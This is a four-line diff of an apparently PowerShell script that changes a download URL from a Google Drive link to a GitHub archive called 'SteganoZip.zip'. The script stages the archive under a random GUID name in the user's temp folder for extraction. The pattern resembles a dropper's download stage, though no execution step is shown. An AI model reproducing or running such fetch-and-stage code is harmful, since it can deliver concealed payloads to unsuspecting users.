@@ -1,4 +1,4 @@
-$url = "https://drive.usercontent.google.com/u/0/uc?id=1d6F_OkBI_WFa_oR0BUAHqBb7MQjgw0cB&export=download"
+$url = "https://github.com/cuunon9x/ghe/blob/main/SteganoZip.zip"
 $dir = [System.Guid]::NewGuid().ToString()
 $zipPath = "$env:temp\$dir.zip"
 $extractPath = "$env:temp\$dir"
